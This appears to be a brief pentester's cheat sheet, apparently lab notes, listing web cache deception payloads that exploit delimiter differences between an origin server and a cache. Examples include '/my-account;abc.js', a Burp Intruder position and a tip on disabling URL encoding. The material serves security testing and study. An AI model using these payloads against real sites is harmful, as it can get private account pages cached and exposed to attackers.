# Delimiter Discrepancy Payloads

## Origin Delimiter Discovery

Reference:

```text
/my-accountabc
```

Test:

```text
/my-account;abc
```

```text
/my-account?abc
```

---

## Static Extension Testing

```text
/my-account;abc.js
```

```text
/my-account?abc.js
```

---

## Generic Pattern

```text
/<dynamic-endpoint><delimiter><arbitrary-string>.js
```

Example:

```text
/settings/users/list;aaa.js
```

---

## Expected Interpretation

```text
Origin:
/settings/users/list
```

```text
Cache:
/settings/users/list;aaa.js
```

---

## Common Extensions

```text
.js
.css
.ico
.exe
```

---

## Intruder Position

```text
/my-account§§abc
```

Use this position to test possible delimiter characters.

---

## Important

Disable automatic URL encoding when testing raw delimiter characters in Burp Intruder.